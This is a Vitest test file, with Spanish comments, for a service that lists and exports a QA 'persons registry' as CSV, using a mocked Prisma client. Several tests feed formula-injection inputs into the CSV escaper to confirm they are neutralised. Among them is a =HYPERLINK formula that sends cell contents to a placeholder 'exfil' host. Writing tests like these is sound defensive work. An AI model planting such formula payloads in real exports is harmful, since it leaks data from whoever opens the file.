// Lectura del "registro de personas" (lado REVISOR_QA): acotado de fechas en
// UTC con límite superior exclusivo, búsqueda libre, forma del listado, escape
// CSV y tope de la exportación. Todo contra un Prisma falso: no se toca la BD.

import { describe, expect, it, vi } from 'vitest';

const db = vi.hoisted(() => ({
  findMany: vi.fn(),
  count: vi.fn(),
}));

vi.mock('../../src/lib/prisma', () => ({
  default: { qaExternaPersona: { findMany: db.findMany, count: db.count } },
}));

import {
  buildWhere,
  csvEscape,
  iterateForExport,
  list,
  toCsvRow,
  MAX_QA_PERSONAS_EXPORT,
  QA_PERSONAS_CSV_HEADERS,
  type QaPersonaDto,
} from '../../src/services/qaExternaPersonasService';

function persona(overrides: Partial<QaPersonaDto> = {}): QaPersonaDto {
  return {
    id: 1,
    clienteRegistroId: '9f1b3c2d-4e5f-4a6b-8c9d-0e1f2a3b4c5d',
    identificadorApp: 'geocampo-tablet-07',
    programa: 'LX',
    nombre: 'María Pérez',
    telefono: '+52 55 1234 5678',
    lat: 19.432608,
    lng: -99.133209,
    accuracy: 8.5,
    capturadoAt: new Date('2026-07-20T15:30:00.000Z'),
    createdAt: new Date('2026-07-20T15:31:00.000Z'),
    dispositivo: { id: 3, identificador: 'BUFF-07' },
    ...overrides,
  };
}

describe('buildWhere', () => {
  it('acota el rango en UTC con límite superior EXCLUSIVO', () => {
    const where = buildWhere({ dateFrom: '2026-07-01', dateTo: '2026-07-31' });
    const rango = where.capturadoAt as { gte: Date; lt: Date };

    expect(rango.gte.toISOString()).toBe('2026-07-01T00:00:00.000Z');
    // El día siguiente a las 00:00Z, NO 23:59:59 en hora local del proceso.
    expect(rango.lt.toISOString()).toBe('2026-08-01T00:00:00.000Z');
    expect(rango).not.toHaveProperty('lte');
  });

  it('acepta los extremos por separado', () => {
    expect(buildWhere({ dateFrom: '2026-02-10' }).capturadoAt).toEqual({
      gte: new Date('2026-02-10T00:00:00.000Z'),
    });
    // Fin de mes: el exclusivo debe caer en el día 1 del mes siguiente.
    expect(buildWhere({ dateTo: '2026-02-28' }).capturadoAt).toEqual({
      lt: new Date('2026-03-01T00:00:00.000Z'),
    });
  });

  it('sin fechas no agrega el filtro de capturadoAt', () => {
    expect(buildWhere({})).toEqual({});
    expect(buildWhere({ programa: 'BUFFALO', dispositivo: 4 })).toEqual({
      programa: 'BUFFALO',
      dispositivoId: 4,
    });
  });

  it('la búsqueda libre va contra nombre (insensitive) y teléfono', () => {
    expect(buildWhere({ q: 'pérez' }).OR).toEqual([
      { nombre: { contains: 'pérez', mode: 'insensitive' } },
      { telefono: { contains: 'pérez' } },
    ]);
  });
});

describe('list', () => {
  it('pagina con take/skip y devuelve { data, pagination }', async () => {
    db.findMany.mockResolvedValue([persona({ id: 9 })]);
    db.count.mockResolvedValue(41);

    const result = await list({ page: 3, limit: 20, programa: 'LX' });

    const args = db.findMany.mock.calls[0][0];
    expect(args.take).toBe(20);
    expect(args.skip).toBe(40);
    expect(args.orderBy).toEqual({ capturadoAt: 'desc' });
    expect(args.where).toEqual({ programa: 'LX' });
    // El mismo where para findMany y count: el total no puede desalinearse.
    expect(db.count.mock.calls[0][0].where).toEqual(args.where);

    expect(result.pagination).toEqual({ page: 3, limit: 20, total: 41, totalPages: 3 });
    expect(result.data).toHaveLength(1);
    expect(result.data[0]).toMatchObject({ id: 9, dispositivo: { identificador: 'BUFF-07' } });
    // El DTO no filtra el metadata crudo del dispositivo.
    expect(result.data[0]).not.toHaveProperty('metadataRaw');
  });
});

describe('csvEscape', () => {
  it('deja intactos los valores simples', () => {
    expect(csvEscape('María Pérez')).toBe('María Pérez');
    expect(csvEscape(19.432608)).toBe('19.432608');
  });

  it('entrecomilla comas, saltos de línea y retornos de carro', () => {
    expect(csvEscape('Pérez, María')).toBe('"Pérez, María"');
    expect(csvEscape('linea1\nlinea2')).toBe('"linea1\nlinea2"');
    expect(csvEscape('linea1\r\nlinea2')).toBe('"linea1\r\nlinea2"');
  });

  it('duplica las comillas internas', () => {
    expect(csvEscape('Juan "El Güero"')).toBe('"Juan ""El Güero"""');
  });

  it('null/undefined salen como celda vacía, no como texto', () => {
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
    expect(csvEscape('')).toBe('');
  });

  // Excel/LibreOffice evalúan como fórmula toda celda de texto que empiece por
  // = + - @ TAB o CR. Sin neutralizarlas pasan dos cosas: el teléfono con lada
  // internacional (el formato que el propio contrato promueve) deja la columna
  // en #NAME?, y un nombre como =HYPERLINK(...) se ejecuta al abrir el archivo.
  it.each([
    ['+52 55 1234 5678', `"'+52 55 1234 5678"`],
    ['=1+1', `"'=1+1"`],
    ['@SUM(A1)', `"'@SUM(A1)"`],
    ['-2+3', `"'-2+3"`],
    ['=HYPERLINK("http://exfil/?"&A2,"ok")', `"'=HYPERLINK(""http://exfil/?""&A2,""ok"")"`],
    ['\tcon tabulador', `"'\tcon tabulador"`],
  ])('neutraliza la celda de texto %s', (entrada, esperado) => {
    expect(csvEscape(entrada)).toBe(esperado);
  });

  it('no toca los números: una longitud negativa no es una fórmula', () => {
    // Prefijar -99.133209 rompería las columnas que el revisor grafica.
    expect(csvEscape(-99.133209)).toBe('-99.133209');
    expect(csvEscape(0)).toBe('0');
  });
});

describe('toCsvRow', () => {
  it('respeta el orden de los encabezados y exporta la fecha en UTC', () => {
    const fila = toCsvRow(persona());
    expect(fila.endsWith('\r\n')).toBe(true);
    expect(fila.trimEnd().split(',')).toEqual([
      'María Pérez',
      // El teléfono va neutralizado: sin el apóstrofo, Excel evalúa `+52 …`
      // como fórmula y deja toda la columna en #NAME?.
      `"'+52 55 1234 5678"`,
      '19.432608',
      '-99.133209',
      '8.5',
      '2026-07-20T15:30:00.000Z',
      'LX',
      'BUFF-07',
      'geocampo-tablet-07',
      '9f1b3c2d-4e5f-4a6b-8c9d-0e1f2a3b4c5d',
    ]);
    expect(QA_PERSONAS_CSV_HEADERS).toHaveLength(10);
  });

  it('deja vacía la precisión cuando el GPS no la reportó', () => {
    expect(toCsvRow(persona({ accuracy: null }))).toContain(',,2026-07-20T15:30:00.000Z,');
  });

  it('neutraliza las columnas de texto y deja intactas las numéricas', () => {
    const fila = toCsvRow(
      persona({
        nombre: '=HYPERLINK("http://exfil/?"&A2,"ok")',
        dispositivo: { id: 3, identificador: '-BUFF-07' },
        identificadorApp: '@geocampo',
        lng: -99.133209,
      }),
    );
    expect(fila.startsWith(`"'=HYPERLINK(`)).toBe(true);
    expect(fila).toContain(`"'-BUFF-07"`);
    expect(fila).toContain(`"'@geocampo"`);
    // La longitud negativa NO lleva apóstrofo: es un número, no una fórmula.
    expect(fila).toContain(',-99.133209,');
  });
});

describe('iterateForExport', () => {
  it('avanza con cursor y termina al llegar un lote incompleto', async () => {
    db.findMany
      .mockResolvedValueOnce([persona({ id: 1 }), persona({ id: 2 })])
      .mockResolvedValueOnce([persona({ id: 3 })]);

    const lotes: QaPersonaDto[][] = [];
    for await (const lote of iterateForExport({ programa: 'LX' }, 2)) lotes.push(lote);

    expect(lotes.map((l) => l.length)).toEqual([2, 1]);
    expect(db.findMany).toHaveBeenCalledTimes(2);
    expect(db.findMany.mock.calls[0][0]).toMatchObject({ take: 2, orderBy: { id: 'asc' } });
    expect(db.findMany.mock.calls[0][0]).not.toHaveProperty('cursor');
    expect(db.findMany.mock.calls[1][0]).toMatchObject({ cursor: { id: 2 }, skip: 1 });
  });

  it('corta en MAX_QA_PERSONAS_EXPORT aunque queden filas por leer', async () => {
    // Siempre devuelve lotes llenos: sin el tope, el generador no pararía.
    db.findMany.mockImplementation(async (args: { take: number }) =>
      Array.from({ length: args.take }, (_, i) => persona({ id: i + 1 })),
    );

    const batchSize = 20_000;
    let filas = 0;
    for await (const lote of iterateForExport({}, batchSize)) filas += lote.length;

    expect(filas).toBe(MAX_QA_PERSONAS_EXPORT);
    // 20 000 + 20 000 + 10 000: el último take se recorta al remanente.
    expect(db.findMany).toHaveBeenCalledTimes(3);
    expect(db.findMany.mock.calls[2][0].take).toBe(MAX_QA_PERSONAS_EXPORT - 2 * batchSize);
  });
});
